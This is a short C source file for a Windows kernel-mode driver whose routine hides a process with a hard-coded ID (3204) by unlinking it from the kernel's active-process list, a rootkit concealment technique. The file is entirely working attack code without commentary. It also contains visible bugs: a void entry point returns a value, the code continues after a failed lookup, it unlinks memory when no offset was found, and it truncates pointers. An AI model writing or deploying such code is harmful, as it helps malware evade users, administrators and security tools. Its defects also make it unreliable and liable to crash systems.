#include <ntifs.h>
#include <ntddk.h>

void Unload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("Unload Driver");
}

NTSTATUS StealthProcess(ULONG pid)
{
	ULONG offset = NULL;
	PULONG ptr;
	PLIST_ENTRY PrevProcess, CurrentProcess, NextProcess;
	NTSTATUS status;
	PEPROCESS process;

	if (!NT_SUCCESS(status = PsLookupProcessByProcessId((PHANDLE)pid, &process)))
	{
		DbgPrint("[-]Error: Unable to open process object(%#x)", status);
	}	

	ptr = (PULONG)process;

	for (ULONG i = 0; i < 512; i++)
	{
		if (ptr[i] == pid)
		{
			offset = (ULONG)&ptr[i + 1] - (ULONG)process;
			DbgPrint("[+]Access Process offset: %#x", offset);
			break;
		}
	}

	if (!offset)
		status = STATUS_UNSUCCESSFUL;
	else
		status = STATUS_SUCCESS;

	CurrentProcess = (PLIST_ENTRY)((PUCHAR)process + offset);

	PrevProcess = CurrentProcess->Blink;
	NextProcess = CurrentProcess->Flink;

	PrevProcess->Flink = CurrentProcess->Flink;
	NextProcess->Blink = CurrentProcess->Blink;

	CurrentProcess->Flink = CurrentProcess;
	CurrentProcess->Blink = CurrentProcess;

	return status;
}

void DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	NTSTATUS stat;

	stat = StealthProcess(3204);
	pDriverObject->DriverUnload = Unload;

	return stat;
}
